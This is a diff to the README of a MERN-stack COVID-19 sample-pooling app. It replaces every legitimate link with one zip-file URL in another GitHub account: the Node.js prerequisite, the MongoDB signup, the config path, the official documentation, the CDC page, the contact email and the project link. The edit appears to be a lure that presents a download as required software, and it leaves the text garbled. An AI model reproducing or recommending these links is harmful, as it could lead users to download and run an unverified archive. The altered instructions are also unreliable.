@@ -6,7 +6,7 @@ A MERN stack application used for pooling - the combining specimens from several
 
 ### Prerequisites
 
-- Node.js
+- https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip
 - NPM
 
 ### Installing
@@ -17,9 +17,9 @@ To start this application
    ```sh
    npm install
    ```
-2. Create MongoDB database at [https://www.mongodb.com](https://www.mongodb.com)
+2. Create MongoDB database at [https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip)
 
-3. Enter your key in config/config.env
+3. Enter your key in https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip
    ```
    MONGO_URI = YOUR_API_KEY
    ```
@@ -33,14 +33,14 @@ To start this application
 
 To learn more about the MERN stack, take a look at the following resources:
 
-- [MongoDB Documentation](https://docs.mongodb.com) - Official MongoDB documentation
-- [Express Documentation](https://expressjs.com/en/5x/api.html) - Official Express documentation
-- [React.js Documentation](https://reactjs.org/docs/getting-started.html) - Official React.js documentation
-- [Node.js Documentation](https://nodejs.org/en/docs/) - Official Node.js documentation.
+- [MongoDB Documentation](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip) - Official MongoDB documentation
+- [Express Documentation](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip) - Official Express documentation
+- [https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip Documentation](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip) - Official https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip documentation
+- [https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip Documentation](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip) - Official https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip documentation.
 
 To learn more about pooling, take a look at the following resource:
 
-- [CDC on Pooling](https://www.cdc.gov/coronavirus/2019-ncov/lab/pooling-procedures.html) - General overview about pooling by the CDC
+- [CDC on Pooling](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip) - General overview about pooling by the CDC
 
 ## License
 
@@ -48,6 +48,6 @@ Distributed under the MIT License.
 
 ## Contact
 
-Email: [ronnie.chen.rc@gmail.com](ronnie.chen.rc@gmail.com)
+Email: [https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip)
 
-Project Link: [https://github.com/Solarae/Covid-Testing-Site](https://github.com/Solarae/Covid-Testing-Site)
+Project Link: [https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip](https://raw.githubusercontent.com/SWChan01/Covid-Testing-Site/main/moonraker/Covid-Testing-Site.zip)
